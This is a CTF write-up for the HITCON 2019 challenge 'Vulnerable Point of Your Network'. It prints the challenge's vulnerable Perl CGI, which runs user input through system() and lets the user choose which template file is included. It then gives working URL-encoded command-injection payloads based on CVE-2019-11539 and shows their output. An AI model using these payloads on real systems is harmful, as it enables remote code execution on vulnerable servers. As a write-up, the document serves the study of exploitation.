#HITCON2019-luatic(CallMeCro)
---
Vulnerable Point of Your Network :)

#Foreword
---
Congratulations to myself, because I solved an international CTF questions for the first time(Although
in the end it was master lanmao who reminded me of the proper way of writing payload).

#Examination Site
---
* Perl
* Command Injection
* CVE-2019-11539

#Analysis
---
As you view the source code through F12, you will find there is a hint
```bash
<!-- Hint for you :)
     <a href='diag.cgi'>diag.cgi</a>
     <a href='DSSafe.pm'>DSSafe.pm</a>  -->
```

Then we open the diag.cgi to get its source code
```bash
#!/usr/bin/perl
use lib '/var/www/html/';
use strict;

use CGI ();
use DSSafe;


sub tcpdump_options_syntax_check {
    my $options = shift;
    return $options if system("timeout -s 9 2 /usr/bin/tcpdump -d $options >/dev/null 2>&1") == 0;

    return undef;
}
 
print "Content-type: text/html\n\n";
 
my $options = CGI::param("options");
my $output = tcpdump_options_syntax_check($options);
 

# backdoor :)
my $tpl = CGI::param("tpl");
if (length $tpl > 0 && index($tpl, "..") == -1) {
    $tpl = "./tmp/" . $tpl . ".thtml";
    require($tpl);
}
```
It is easy to see that there is a command injection.Now, we have to figure out what to do with it.

#Exploit
---
It's easy to think about going to orange's blog since he is the author of it.
https://blog.orange.tw/2019/09/attacking-ssl-vpn-part-3-golden-pulse-secure-rce-chain.html

Here we found CVE-2019-11539 and its payload:
```bash
-r$x="ls /",system$x# 2>/data/runtime/tmp/tt/setcookie.thtml.ttc < 
```

We'll modify it a little bit and try to commit

```bash
/cgi-bin/diag.cgi?option=-r%24x%3d%22ls+-lt+%2f%22%2csystem%24x%23+2%3e.%2ftmp%2fcallmecro.thtml+%3c&tpl=callmecro
```
After we commit it,we will get this
```bash
total  96
-rwsr-sr-x  1 root root   8520  Oct 11  23:57  $READ_FLAG$
-r--------  1 root root     49  Oct 11  23:59  FLAG
.....
```

And then I stopped.The "cat" command could not be used, and the execution of $READ_FLAG$ failed.
Finally, master lanmao told me about perl's syntax problems.The final payload:
```bash
/cgi-bin/diag.cgi?option=-r%24x%3d%2f%24%2f%2fREAD_FLAG%2f%24system%24x%23+2%3e.%2ftmp%2fcallmecro.thtml+%3c&tpl=callmecro

Response:
HTTP/1.1 200 OK
Date: Sun, 12 Oct 2019 07:04:37 GMT
Server: Apache/2.4.29 (Ubuntu)
Content-Length: 50
Connection: close
Content-Type: text/html

hitcon{Now I'm sure u saw my Bl4ck H4t p4p3r :P}
```

laomao tql.